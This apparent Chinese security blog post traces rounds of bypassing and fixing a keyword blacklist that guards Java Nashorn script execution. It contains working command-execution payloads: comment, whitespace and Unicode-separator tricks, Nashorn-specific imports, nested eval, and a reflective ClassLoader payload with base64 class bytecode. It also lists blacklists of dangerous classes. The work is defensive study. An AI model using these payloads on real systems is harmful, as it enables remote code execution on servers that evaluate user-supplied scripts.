### 起因

前几天做安全测试，发现了一个可以执行js代码的地方，然后通过代码审计发现存在命令执行。作为甲方公司安全人员，如何攻击和修复都需要考虑。一边思考着让开发如何修，一边想着如何绕过修好的黑名单，于是一场左右手的博弈就这样悄无声息地开始了。

### 过程

#### 0x01 漏洞发现

当时通过代码审计，发现执行js之前会有一个简单的正则校验，主要检查是否存在字段： **function mainOutput(){}** 。如果传入的字符串符合正则就会调用 `javax.script.ScriptEngine` 类来解析js并执行js代码。

```java
//正则表达式
String JAVASCRIPT_MAIN="[\\s\\S]*"+"function"+"\\s+"+"mainOutput"+"[\\s\\S]*";
//传入的字符串
String test="print('hello word!!');function mainOutput() {}";
//代码执行的地方
if (Pattern.matches(JAVASCRIPT_MAIN,test)){
    ScriptEngineManager manager = new ScriptEngineManager(null);
    ScriptEngine engine = manager.getEngineByName("js");
    engine.eval(test);
}
```

因为scriptEngine的相关特性，可以执行java代码，所以当我们把test替换为如下代码，就可以命令执行了。

```java
String test="var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("calc")};";
```

#### 0x02 漏洞修复讨论

至此，我已经发现了这个比较简单的命令执行漏洞，然后我写了报告，觉得已经完事了。但是，事情不是这么发展的。因为解决这个问题的根本方法是底层做沙箱，或者上js沙箱。但是底层沙箱和js沙箱都做不到，一个过于复杂另外一个过于影响效率(**效率降低了10倍，这是一个产品不能接受的**)。  
所以我们就需要找到一个其他方法了，新的思路就是黑名单或者白名单。为了灵活性(灵活性是安全的最大敌人)，为了客户方便，不可能采取白名单，所以只能使用黑名单了。

#### 0x03 第一次博弈

这是开发第一次发给我的代码，可以看出来，使用黑名单对一些关键字做了一些过滤。这些关键字都来自于阿里云的java沙箱  
<https://github.com/AlibabaCloudDocs/odps/blob/master/cn.zh-CN/%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97/Java%E6%B2%99%E7%AE%B1.md>

```java
class KeywordCheckUtils {

    private static final Set<String> blacklist = Sets.newHashSet(
            // Java 全限定类名
            "java.io.File", "java.io.RandomAccessFile", "java.io.FileInputStream", "java.io.FileOutputStream",
            "java.lang.Class", "java.lang.ClassLoader", "java.lang.Runtime", "java.lang.System", "System.getProperty",
            "java.lang.Thread", "java.lang.ThreadGroup", "java.lang.reflect.AccessibleObject", "java.net.InetAddress",
            "java.net.DatagramSocket", "java.net.DatagramSocket", "java.net.Socket", "java.net.ServerSocket",
            "java.net.MulticastSocket", "java.net.MulticastSocket", "java.net.URL", "java.net.HttpURLConnection",
            "java.security.AccessControlContext",
            // JavaScript 方法
            "eval", "new function");

    public KeywordCheckUtils() {
        // 空构造方法
    }

    public static void checkInsecureKeyword(String code) throws Exception {
        Set<String> insecure =
                blacklist.stream().filter(s -> StringUtils.containsIgnoreCase(code, s)).collect(Collectors.toSet());
        if (!CollectionUtils.isEmpty(insecure)) {
            throw new Exception("输入字符串不是安全的");
        }else{
            ScriptEngineManager manager = new ScriptEngineManager(null);
            ScriptEngine engine = manager.getEngineByName("js");
            engine.eval(code);
        }

    }
}
```

我们可以清楚地看到。`Runtime`类被禁用了，有没有一些没有被禁用的函数呢，有没有一些可能绕过的思路呢？  
我的第二次攻击就开始了。  
我找到了新的可以使用的函数**ProcessBuilder**和**使用注释绕过**的方法。

```java
//黑名单中没有注释的类
String test="var a = mainOutput(); function mainOutput() { var x=new java.lang.ProcessBuilder; x.command(\"calc\"); x.start();return true;};";
//在点两边可以添加注释绕过过滤
String test="var a = mainOutput(); function mainOutput() { var x=java.lang./****/Runtime.getRuntime().exec(\"calc\");};";
```

#### 0x04 第二次博弈

过了一会研发给我发了新的检测类,可以看到它主要做了两个处理，过滤了注释和多个空格换一个。

```java
import com.google.common.collect.Sets;
import java.util.Set;
import java.util.stream.Collectors;
import org.apache.commons.lang3.StringUtils;
import org.springframework.util.CollectionUtils;

public class KeywordCheckUtils {

    private static final Set<String> blacklist = Sets.newHashSet(
            // Java 全限定类名
            "java.io.File", "java.io.RandomAccessFile", "java.io.FileInputStream", "java.io.FileOutputStream",
            "java.lang.Class", "java.lang.ClassLoader", "java.lang.Runtime", "java.lang.System", "System.getProperty",
            "java.lang.Thread", "java.lang.ThreadGroup", "java.lang.reflect.AccessibleObject", "java.net.InetAddress",
            "java.net.DatagramSocket", "java.net.DatagramSocket", "java.net.Socket", "java.net.ServerSocket",
            "java.net.MulticastSocket", "java.net.MulticastSocket", "java.net.URL", "java.net.HttpURLConnection",
            "java.security.AccessControlContext", "java.lang.ProcessBuilder",
            // JavaScript 方法
            "eval","new function");

    private KeywordCheckUtils() {
        // 空构造方法
    }
    public static void checkInsecureKeyword(String code) {
        // 去除注释
        String removeComment = StringUtils.replacePattern(code, "(?:/\\*(?:[^*]|(?:\\*+[^*/]))*\\*+/)|(?://.*)", "");
        // 多个空格替换为一个
        String finalCode = StringUtils.replacePattern(removeComment, "\\s+", " ");
        Set<String> insecure = blacklist.stream().filter(s -> StringUtils.containsIgnoreCase(finalCode, s))
                .collect(Collectors.toSet());
        if (!CollectionUtils.isEmpty(insecure)) {
            throw new Exception("输入字符串不是安全的");
        }
    }
}
```

为什么要这么做呢？因为黑名单中有一个new function。为了检测new function，所以他多个空格换成一个空格。到这里我就突然想到了空格，既然注释可以绕过，空格是不是也可以绕过呢。然后就绕过了。

```java
String test="var a = mainOutput(); function mainOutput() { var x=java.lang.   Runtime.getRuntime().exec(\"calc\");};";
```

#### 0x05最后的修复代码

因为其他内容未做改变，所以只贴出改变的内容。最后的过滤呢，先过滤了注释，然后在去匹配过滤空格和剩下一个空格的。  
这一步的操作就是为了匹配new function。

```java
// 去除注释
String removeComment = StringUtils.replacePattern(code, "(?:/\\*(?:[^*]|(?:\\*+[^*/]))*\\*+/)|(?://.*)", " ");
// 去除空格
String removeWhitespace = StringUtils.replacePattern(removeComment, "\\s+", "");
// 多个空格替换为一个
String oneWhiteSpace = StringUtils.replacePattern(removeComment, "\\s+", " ");
Set<String> insecure = blacklist.stream().filter(s -> StringUtils.containsIgnoreCase(removeWhitespace, s) ||
                                                 StringUtils.containsIgnoreCase(oneWhiteSpace, s)).collect(Collectors.toSet());
```

#### 0x06 一些总结

- 为什么要禁用new function呢？这是因为js的特性，可以使用js返回一个新的对象，如下面的字符串。可以看到这种情况就很难通过字符串匹配来过滤了。
    
    ```java
    var x=new Function('return'+'(new java.'+'lang.ProcessBuilder)')();  x.command("calc"); x.start(); var a = mainOutput(); function mainOutput() {};
    ```
- 黑名单总是存在潜在的风险，总会出现新的绕过思路。而白名单就比黑名单好很多，但是又失去了很多灵活性。
- 如果没有禁用eval，会有什么样的绕过方式呢？下面的套娃，就可以实现
    
    ```java
    var a = mainOutput(); function mainOutput() { new javax.script.ScriptEngineManager().getEngineByName("js").eval("var a = test(); function test() { var x=java.lang."+"Runtime.getRuntime().exec(\"calc\");};"); };
    ```
    
    零、前言
    ----
    
    > 前段时间做渗透测试发现了js命令执行，为了更深入理解发现更多的安全绕过问题，经过先知各位大佬给的一些提示，于是有了第二篇。

在java1.8以前，java内置的javascript解析引擎是基于Rhino。自**JDK8**开始，使用新一代的javascript解析名为Oracle Nashorn。Nashorn在jdk15中被移除。所以下面的**命令执行在JDK8-JDK15都是适用**的。  
而这次分析的主角就是Nashorn解析引擎，因为它的一些特性，让我们可以有了更多命令执行的可能。

一、简单使用
------

我们先来看一下Nashorn是怎么使用的。我们可以调用`javax.script` 包来调用Nashorn解析引擎。下面用一段代码说明

```java
String test="function fun(a,b){ return a+b; }; print(fun(1,4));";
ScriptEngineManager manager = new ScriptEngineManager(null);
//根据name获取解析引擎，在jdk8环境下下面输入的js和nashorn获取的解析引擎是相同的。
ScriptEngine engine = manager.getEngineByName("js");
engine.eval(test);
//执行结果
//5
```

上面的代码很简单就是定义了一个js函数加法函数fun，然后执行`fun(1,4)`，就会得到结果。

二、特性说明
------

### 2.1 全局变量的属性

Nashorn将所有Java包都定义为名为`Packages`的全局变量的属性。  
例如，`java.lang`包可以称为`Packages.java.lang` ，比如下面的代码就可以生成一个String字符串。  
Nashorn将 **java，javax，org，com，edu** 和 **net** 声明为全局变量，分别是 **Packages.java Packages.javax Packages.org Packages.com Packages.edu和 Packages.net** 的别名。我们可以使用`new`操作符来实例化一个java对象，比如下面的代码。

```java
var a=new Packages.java.lang.String("123"); print(a);
//上面的代码等价于
var a=new java.lang.String("123"); print(a);
//结果
//123
```

### 2.2 Java全局对象

Nashorn定义了一个称为Java的新的全局对象，它包含许多有用的函数来使用Java包和类。  
`Java.type()`函数可用于获取对精确Java类型的引用。还可以获取原始类型和数组

```java
var JMath=Java.type("java.lang.Math"); print(JMath.max(2,6))
//输出结果6
//获取原始数据类型int
var primitiveInt = Java.type("int");
var arrayOfInts = Java.type("int[]");
```

### 2.3 兼容Rhino功能

Mozilla Rhino是Oracle Nashorn的前身，因为Oracle JDK版本提供了JavaScript引擎实现。它具有`load(path)`加载第三方JavaScript文件的功能。这在Oracle Nashorn中仍然存在。我们可以使用它加载特殊的兼容性模块，该模块提供`importClass`导入类（如Java中的显式导入）和`importPackage`导入包：

```java
load(
"nashorn:mozilla_compat.js");
//导入类
importClass(java.util.HashSet);
var set = new HashSet();
//导入包
importPackage(java.util);
var list = new ArrayList();
```

### 2.4 Rhino的另外一个函数JavaImporter

`JavaImporter`将可变数量的参数用作Java程序包，并且返回的对象可用于`with`范围包括指定程序包导入的语句中。全局JavaScript范围不受影响，因此`JavaImporter`可以更好地替代`importClass`和`importPackage`。

```java
var CollectionsAndFiles = new JavaImporter(
    java.util,
    java.io,
    java.nio);

with (CollectionsAndFiles) {
  var files = new LinkedHashSet();
  files.add(new File("Plop"));
  files.add(new File("Foo"));
}
```

三、从新开始绕过
--------

在对Nashorn引擎有了新的理解后，我又有了非常多新的思路可以使用，而且都已经正常弹出计算机。

```java
//使用特有的Java对象的type()方法导入类，轻松绕过
String test51="var JavaTest= Java.type(\"java.lang\"+\".Runtime\"); var b =JavaTest.getRuntime(); b.exec(\"calc\");";
//兼容Rhino功能，又有了两种新的绕过方式。
String test52 = "load(\"nashorn:mozilla_compat.js\"); importPackage(java.lang); var x=Runtime.getRuntime(); x.exec(\"calc\");";
String test54="var importer =JavaImporter(java.lang); with(importer){ var x=Runtime.getRuntime().exec(\"calc\");}";
```

在上一篇文章中，飞鸿师傅给了我一个关于ClassLoader的思路，这是我当时没想到的。因为黑名单中已经禁用了`java.lang.ClassLoader`和`java.lang.Class`当时就是想着防止反射调用和ClassLoader加载。(**只怪我java不好**)，以下代码由**feihong师傅提供\*\***。\*\*  
这个绕过还是很有意思的，先通过子类获取`ClassLoader`类，然后通过反射执行`ClassLoader`的`definClass`方法，从字节码中加载一个恶意类。下面的classBytes存储的就是一个恶意类，后面通过实例恶意类完成攻击。

```java
String test55 = "var clazz = java.security.SecureClassLoader.class;\n" +
                "        var method = clazz.getSuperclass().getDeclaredMethod('defineClass', 'anything'.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "        method.setAccessible(true);\n" +
                "        var classBytes = 'yv66vgAAADQAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAJTEV4cGxvaXQ7AQAKRXhjZXB0aW9ucwcAGQEAClNvdXJjZUZpbGUBAAxFeHBsb2l0LmphdmEMAAcACAcAGgwAGwAcAQAEY2FsYwwAHQAeAQAHRXhwbG9pdAEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAQABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAQABAAFAA0ABgALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQAAAAAgAR';" +
                "        var bytes = java.util.Base64.getDecoder().decode(classBytes);\n" +
                "        var constructor = clazz.getDeclaredConstructor();\n" +
                "        constructor.setAccessible(true);\n" +
                "        var clz = method.invoke(constructor.newInstance(), bytes, 0 , bytes.length);\nprint(clz);" +
                "        clz.newInstance();";
```

恶意类的代码如下。上面的classBytes就是`Exploit`类的字节码

```java
import java.io.IOException;

public class Exploit {
    public Exploit() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```

从上面的代码让我意识到禁用`java.lang.Class`是不可能就阻止反射的，于是我开始思考一个反射poc中的哪些是重要的关键字。反射方法的调用和实例化都是关键的一步，他们一定需要执行。所以我禁掉了这两个关键字。  
新的黑名单就这么形成了。

```java
 private static final Set<String> blacklist = Sets.newHashSet(
            // Java 全限定类名
            "java.io.File", "java.io.RandomAccessFile", "java.io.FileInputStream", "java.io.FileOutputStream",
            "java.lang.Class", "java.lang.ClassLoader", "java.lang.Runtime", "java.lang.System", "System.getProperty",
            "java.lang.Thread", "java.lang.ThreadGroup", "java.lang.reflect.AccessibleObject", "java.net.InetAddress",
            "java.net.DatagramSocket", "java.net.DatagramSocket", "java.net.Socket", "java.net.ServerSocket",
            "java.net.MulticastSocket", "java.net.MulticastSocket", "java.net.URL", "java.net.HttpURLConnection",
            "java.security.AccessControlContext", "java.lang.ProcessBuilder",
            //反射关键字
            "invoke","newinstance",
            // JavaScript 方法
            "eval", "new function",
            //引擎特性
            "Java.type","importPackage","importClass","JavaImporter"
            );
```

四、源码的路越走越远
----------

[@小路鹿快跑](https://xz.aliyun.com/u/39987) 这位师傅给了我下面的代码，但是我在测试中发现是行不通的，unicode到最后被检测出来了,但是依旧感谢这位师傅,因为unicode给了我新的想法(那就是看源码)

```java
String test53 = "\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065.getRuntime().exec(\"calc\");";
```

### 4.1 unicode换行符

既然Nashorn是一个解析引擎,那么他一定有词法分析器.(**感叹编译原理没有白学**)。于是我下载了源码，开始对源码进行分析。我在`jdk.nashorn.internal.parser`包下面发现了`Lexer`类。类中有几个函数是用来判断`js空格`和`js换行符` 的，其中主要的三个字符串如下。

```java
private static final String LFCR     = "\n\r"; // line feed and carriage return (ctrl-m) 
private static final String JAVASCRIPT_WHITESPACE_EOL =
    LFCR +
    "\u2028" + // line separator
    "\u2029"   // paragraph separator
    ;
private static final String JAVASCRIPT_WHITESPACE =
    SPACETAB +
    JAVASCRIPT_WHITESPACE_EOL +
    "\u000b" + // tabulation line
    "\u000c" + // ff (ctrl-l)
    "\u00a0" + // Latin-1 space
    "\u1680" + // Ogham space mark
    "\u180e" + // separator, Mongolian vowel
    "\u2000" + // en quad
    "\u2001" + // em quad
    "\u2002" + // en space
    "\u2003" + // em space
    "\u2004" + // three-per-em space
    "\u2005" + // four-per-em space
    "\u2006" + // six-per-em space
    "\u2007" + // figure space
    "\u2008" + // punctuation space
    "\u2009" + // thin space
    "\u200a" + // hair space
    "\u202f" + // narrow no-break space
    "\u205f" + // medium mathematical space
    "\u3000" + // ideographic space
    "\ufeff"   // byte order mark
    ;
```

很显然到这里我们已经获取了非常多的可以替换空格和换行符的unicode码。于是我就简单尝试了一下绕过。在尝试过程中发现部分也是可以被检测出来的，而另外一部分不起作用。**我猜想是js和java的处理这些字符的逻辑不同导致的**

```java
String test62="var test = mainOutput(); function mainOutput() { var x=java.\u2029lang.Runtime.getRuntime().exec(\"calc\");};";
```

### 4.2 注释函数分析

先把原来的一个注释过滤的代码拿过来，可以看到对注释的处理用的是正则，所以才被上面的unicode绕过了。

```java
String removeComment = StringUtils.replacePattern(code, "(?:/\\*(?:[^*]|(?:\\*+[^*/]))*\\*+/)|(?://.*)", " ");
```

看上面的正则，我们发现对于单行注释的替换非常简单，就是以`//`开头的后面的内容都替换为空，这就出现了新的绕过。这个绕过的原因是因为和解析器对于注释的解析不同造成的。  
先看一下`skipComments`函数。

```java
protected boolean skipComments() {
        // Save the current position.
        final int start = position;

        if (ch0 == '/') {
            // Is it a // comment.
            if (ch1 == '/') {
                // Skip over //.
                skip(2);
                // Scan for EOL.
                while (!atEOF() &amp;&amp; !isEOL(ch0)) {
                    skip(1);
                }
                // Did detect a comment.
                add(COMMENT, start);
                return true;
            } else if (ch1 == '*') {
                // Skip over /*.
                skip(2);
                // Scan for */.
                while (!atEOF() &amp;&amp; !(ch0 == '*' &amp;&amp; ch1 == '/')) {
                    // If end of line handle else skip character.
                    if (isEOL(ch0)) {
                        skipEOL(true);
                    } else {
                        skip(1);
                    }
                }

                if (atEOF()) {
                    // TODO - Report closing */ missing in parser.
                    add(ERROR, start);
                } else {
                    // Skip */.
                    skip(2);
                }

                // Did detect a comment.
                add(COMMENT, start);
                return true;
            }
        } else if (ch0 == '#') {
            assert scripting;
            // shell style comment
            // Skip over #.
            skip(1);
            // Scan for EOL.
            while (!atEOF() &amp;&amp; !isEOL(ch0)) {
                skip(1);
            }
            // Did detect a comment.
            add(COMMENT, start);
            return true;
        }

        // Not a comment.
        return false;
    }
```

从上面的代码可以看出来，当遇到以`/`开头的就会检测第二个是不是`/`如果是的话就回去找`EOF换行符`，而这些`//......EOF`之间的内容都会被当做注释绕过的。  
那么当我们的代码是如下的样子

```java
String test61="var test = mainOutput(); function mainOutput() { var x=java.lang.//\nRuntime.getRuntime().exec(\"calc\");};";
```

因为我们的正则不严谨，用于匹配的字符串为`var test = mainOutput(); function mainOutput() { var x=java.lang.`而被解析后的代码为`var test = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec(\"calc\");};` 成功绕过了我们的检测。  
上面的代码还有一个关于`#`的注释，但是一直没有尝试成功，猜测可能跟`assert scripting`这行代码有关。

### 4.3 最后的修复方案

```java
class KeywordCheckUtils7 {

    private static final Set<String> blacklist = Sets.newHashSet(
            // Java 全限定类名
            "java.io.File", "java.io.RandomAccessFile", "java.io.FileInputStream", "java.io.FileOutputStream",
            "java.lang.Class", "java.lang.ClassLoader", "java.lang.Runtime", "java.lang.System", "System.getProperty",
            "java.lang.Thread", "java.lang.ThreadGroup", "java.lang.reflect.AccessibleObject", "java.net.InetAddress",
            "java.net.DatagramSocket", "java.net.DatagramSocket", "java.net.Socket", "java.net.ServerSocket",
            "java.net.MulticastSocket", "java.net.MulticastSocket", "java.net.URL", "java.net.HttpURLConnection",
            "java.security.AccessControlContext", "java.lang.ProcessBuilder",
            //反射关键字
            "invoke","newinstance",
            // JavaScript 方法
            "eval", "new function",
            //引擎特性
            "Java.type","importPackage","importClass","JavaImporter"
            );

    public KeywordCheckUtils7() {
        // 空构造方法
    }

    public static void checkInsecureKeyword(String code) throws Exception {
        // 去除注释
        String removeComment = StringUtils.replacePattern(code, "(?:/\\*(?:[^*]|(?:\\*+[^*/]))*\\*+/)|(?://.*[\n\r\u2029\u2028])", " ");
        //去除特殊字符
        removeComment =StringUtils.replacePattern(removeComment,"[\u2028\u2029\u00a0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\ufeff]","");
        // 去除空格
        String removeWhitespace = StringUtils.replacePattern(removeComment, "\\s+", "");
        // 多个空格替换为一个
        String oneWhiteSpace = StringUtils.replacePattern(removeComment, "\\s+", " ");
        System.out.println(removeWhitespace);
        System.out.println(oneWhiteSpace);
        Set<String> insecure = blacklist.stream().filter(s -> StringUtils.containsIgnoreCase(removeWhitespace, s) ||
                StringUtils.containsIgnoreCase(oneWhiteSpace, s)).collect(Collectors.toSet());

        if (!CollectionUtils.isEmpty(insecure)) {
            System.out.println("存在不安全的关键字:"+insecure);
            throw new Exception("存在安全问题");
        }else{
            ScriptEngineManager manager = new ScriptEngineManager(null);
            ScriptEngine engine = manager.getEngineByName("js");
            engine.eval(code);
        }
    }
}
```

附录
--

### 源码下载

<http://hg.openjdk.java.net/jdk8/jdk8/nashorn/archive/tip.zip>

### 参考

<https://www.oracle.com/technical-resources/articles/java/jf14-nashorn.html>